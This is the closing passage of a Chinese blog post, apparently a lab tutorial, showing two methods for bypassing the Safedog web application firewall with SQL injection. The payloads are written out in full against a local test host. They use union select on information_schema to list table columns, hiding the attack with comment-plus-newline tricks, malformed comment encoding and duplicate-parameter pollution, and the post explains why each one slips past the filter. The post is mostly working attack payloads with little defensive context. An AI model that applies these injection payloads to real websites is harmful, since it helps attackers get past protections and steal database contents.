<p>0x05：第三种绕过方法，精通mysql语法，自然懂的绕过方法<br> 执行语句绕过：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ union – www.hacker.wang%0aselect 1, 2,3,4, group_concat(column_name),6 from information_schema.columns where table_schema=database () and – www.hacker.wang%0a table_name=0x7573657273–+<br> <img src="https://images2.imgbox.com/ce/3b/BFl5bHwW_o.png" alt="在这里插入图片描述"><br> –:表示注释，在mysql中真正的注释是"-- "，这里必须有个空格，否则不是注释，%0a是换行的url编码，换号后，表示重新查询，前面的注释对后面的语句将不再影响，这也要注意，<br> database空格(）这里，中间有个空格<br> 0x06：第四种绕过方法，特殊的URL编码绕过安全狗<br> 执行语句绕过：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ union/<em>%!a</em>/select 1,2,3,4, group_concat(column_name),6 from information_schema.columns where table_schema=database () and table_name in (0x7573657273) --+<br> <img src="https://images2.imgbox.com/73/3f/11TVRvaT_o.png" alt="在这里插入图片描述"><br> http://192.168.31.142/safedog/bihuo.php?tel=1&amp;bihuo=/<em>&amp;tel=1’union select 1,2,3,4, group_concat(column_name),6 from information_schema.columns where table_schema=database() and table_name=‘users’ --+</em>/<br> <img src="https://images2.imgbox.com/e5/8d/t7khXOnn_o.png" alt="在这里插入图片描述"><br> 这里红色框处，当url参数出现两个同名参数时，将取最后一个参数的值，所以这里会取后面的tel的值，前面传参/<em>,后面</em>/闭合：</p> 
<p>绕过分析：安全狗误以为/**/是注释的内容所以全部忽略。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/159d4334bb065a8faa4d87ccb02dc0ac/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【问题解决】ubuntu20.04安装驱动不成功</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/707f4a98814e3fbfd6ceb601235d3449/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【vue】关于路由的使用&#43;vite跨域</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>